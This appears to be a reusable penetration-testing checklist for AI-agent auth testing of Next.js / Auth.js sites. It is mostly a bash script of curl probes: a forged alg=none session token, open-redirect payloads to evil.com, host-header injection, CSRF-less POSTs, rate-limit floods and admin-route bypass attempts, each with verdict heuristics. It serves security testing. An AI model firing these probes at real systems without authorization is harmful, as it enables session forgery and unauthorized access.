# NextAuth / AuthJS v5 — AuthN/AuthZ Boundary Probe Matrix

Reusable checklist for "WAVE N AGENT — auth boundary test" briefs against
Next.js + Auth.js (NextAuth v5) targets. Fire as ONE bash script, tee results
to `auth_probe.log`, verdict each item EXPLOITABLE / BLOCKED / DISCOVERY /
NEEDS-AUTH.

Pre-flight: hit `https://TARGET/api/auth/providers` once — the JSON response
enumerates every configured provider id (`google`, `github`, `email`,
`credentials`, …). This drives every later callback-URL guess. If the response
is `{ "google": {...}, "credentials": {...} }` you know `/api/auth/callback/{google,credentials}`
are live routes; any other guessed provider path is recon-grade, not a finding.

## Items (a)–(l) canonical probe set

```bash
B="https://TARGET"
OUT=auth_probe.log
run(){ local label="$1"; shift; { echo "===== $label ====="; echo "\$ $*";
  "$@" -sk -o /tmp/body.$$ -w 'HTTP %{http_code} size=%{size_download}\n' "$@";
  head -c 400 /tmp/body.$$; echo; echo; } | tee -a "$OUT"; }

# (a) enumeration
run "a1 session"    curl -4 "$B/api/auth/session"
run "a2 csrf"       curl -4 "$B/api/auth/csrf"
run "a3 providers"  curl -4 "$B/api/auth/providers"
run "a4 signin"     curl -4 "$B/api/auth/signin"

# (b) callback confusion — drive provider list from (a3)
for p in google credentials email oauth; do
  run "b cb/$p error"      curl -4 "$B/api/auth/callback/$p?error=access_denied&state=x"
  run "b cb/$p code+state" curl -4 "$B/api/auth/callback/$p?code=x&state=x"
done
run "b cb/email token" curl -4 "$B/api/auth/callback/email?token=x"

# (c) cookie-name fingerprint — discover Set-Cookie name first:
#   curl -4 -sI -X POST $B/api/auth/signin/google | grep -i 'set-cookie'
# Common variants: next-auth.session-token | __Secure-next-auth.session-token |
#   authjs.session-token | __Secure-authjs.session-token
# Forged alg=none JWT (header.payload.Signature empty):
#   <REDACTED-JWT>
run "c alg=none session" curl -4 -H 'Cookie: __Secure-authjs.session-token=<REDACTED-JWT>' "$B/api/auth/session"

# (d) CSRF — POST without cookie/header. Auth.js rejects with 400/401 unless
#     the route is intentionally CSRF-exempt.
run "d signin/email no csrf"      curl -4 -X POST -d 'email=a@b.c' "$B/api/auth/signin/email"
run "d cb/credentials no csrf"    curl -4 -X POST -d 'username=u&password=p' "$B/api/auth/callback/credentials"

# (e) open redirect via callbackUrl — Location header is the verdict.
for cb in '//evil.com' 'https://evil.com' '/\/evil.com' '/\\evil.com' '%2f%2fevil.com'; do
  run "e signin?callbackUrl=$cb" curl -4 -I "$B/api/auth/signin?callbackUrl=$cb"
done
run "e signout?callbackUrl" curl -4 -I "$B/api/auth/signout?callbackUrl=//evil.com"

# (f) Host / X-Forwarded-Host reflection in absolute URLs inside the JSON
run "f XFH" curl -4 -H 'X-Forwarded-Host: evil.com' "$B/api/auth/signin/email"
# Grep the captured body for "evil.com" — reflection = poison password-reset /
# magic-link flows downstream.

# (g) OTP rate limit — 5 rapid POSTs, watch for 429/Retry-After
for i in 1 2 3 4 5; do
  run "g otp #$i" curl -4 -X POST -d "email=u$i@x.c" "$B/api/auth/signin/email"
done

# (h) locale / prefix bypass on admin routes — record status + first 100 chars
for p in /en/admin /zh/admin /zh/admin/orders /admin /admin/users \
         /api/admin/users /api/admin/orders /api/admin/refund \
         /api/admin/invite /api/admin/credits; do
  run "h GET $p" curl -4 "$B$p"
done

# (i) method tampering
for m in TRACE OPTIONS PUT PATCH DELETE; do
  run "i $m /admin"            curl -4 -X "$m" "$B/admin"
  run "i $m /api/auth/session" curl -4 -X "$m" "$B/api/auth/session"
done

# (j) version / stack leak via malformed JSON
run "j bad json" curl -4 -X POST -H 'Content-Type: application/json' -d '{' "$B/api/auth/signin"
run "j bad json cb" curl -4 -X POST -H 'Content-Type: application/json' -d '{"x":' "$B/api/auth/callback/credentials"

# (k) provider strategy disclosure — what auth surface exists at all.
run "k providers pretty" curl -4 "$B/api/auth/providers"

# (l) RSC header probe — Next.js Server Components return a different wire
#     format than the HTML shell; sometimes leaks server-only data or stack.
run "l RSC /admin" curl -4 -H 'RSC: 1' -H 'Next-Router-State-Tree: %5B%22%22%5D' "$B/admin"
run "l RSC homepage" curl -4 -H 'RSC: 1' "$B/"
```

## Verdict heuristics per item

- **(a) 200 JSON `{}`/empty session** — expected BLOCKED. `next-auth.session-token`
  cookie name reveals Auth.js vs NextAuth v4.
- **(b) callback errors** — expect redirect to `?error=Configuration` or
  `OAuthCallbackError`. Anything that creates a session from a forged
  `code`/`token` is **EXPLOITABLE**.
- **(c) alg=none accepted** — session JSON returns a real user ⇒ critical. Any
  "invalid token" / `{}` / 401 ⇒ BLOCKED.
- **(d) CSRF exempt POSTs return 200 + Set-Cookie** ⇒ check whether a session
  was actually created. Auth.js default: missing CSRF → `400 MissingCSRF`.
- **(e) Location: //evil.com** in response ⇒ open redirect, EXPLOITABLE.
  `/?callbackUrl=…`, stripped to `/`, or same-origin forced ⇒ BLOCKED.
- **(f) body / absolute URLs echo `evil.com`** ⇒ host-header injection;
  confirm downstream magic-link / reset-email uses poisoned host.
- **(g)** all 5× `200` with no `Retry-After` ⇒ DISCOVERY (no rate limit at
  edge); `429` after N requests ⇒ BLOCKED at edge, retest at slower cadence.
- **(h) mixed 200 on some locale prefixes but 307/401 on others** ⇒ locale
  middleware bypass, EXPLOITABLE. Uniform 307 to `/api/auth/signin` ⇒ BLOCKED.
  Distinguish carefully: Next.js catch-all returns 200 HTML for ALL paths —
  diff against homepage bytes to tell "shell" from "real content".
- **(i) 405/501** ⇒ BLOCKED. `200` with body ≠ GET body ⇒ DISCOVERY.
- **(j) any `next-auth@`, `authjs@`, stack frame, file path, or `Prisma` /
  `Drizzle` name** in error body ⇒ DISCOVERY (version fingerprint).
- **(k)** pure enumeration — DISCOVERY unless `credentials` provider exists
  with weak password policy.
- **(l) RSC payload differs from HTML shell, contains `"NEXT_REDIRECT"` or
  auth-only strings** ⇒ confirms route is RSC-gated, may expose props.
  `500` with stack ⇒ DISCOVERY.

## Pitfalls specific to auth probing

- **Catch-all false 200** — same trap as the `/api/*` catch-all in SKILL.md
  pre-flight, but ALSO applies to `/en/…` and `/zh/…` prefixes. Always diff
  against `/` bytes before calling a 200 "real".
- **Magic-link echo != exploit** — `/api/auth/signin/email` commonly returns
  `{"url":"...verify..."}` with the submitted email echoed; that is the
  design, not a leak. The EXPLOITABLE variant is the URL carrying a
  **poisoned host** (item f).
- **CSRF cookies** — on v5 the CSRF cookie name is
  `__Host-authjs.csrf-token`; on v4 it's `__Host-next-auth.csrf-token`. Probe
  both, log which one Set-Cookie reveals.
- **429 ≠ verdict** — edge 429 during item (g) is a rate-limit waf hit,
  BLOCKED-at-edge, not evidence the application itself rate-limits. Slow down
  and re-probe before writing "no rate limit".
- **Provider list driven attack surface** — never guess
  `/api/auth/callback/{azure,adfs,okta,…}` blindly; only the ids in (a3) are
  routable. Everything else is recon noise.
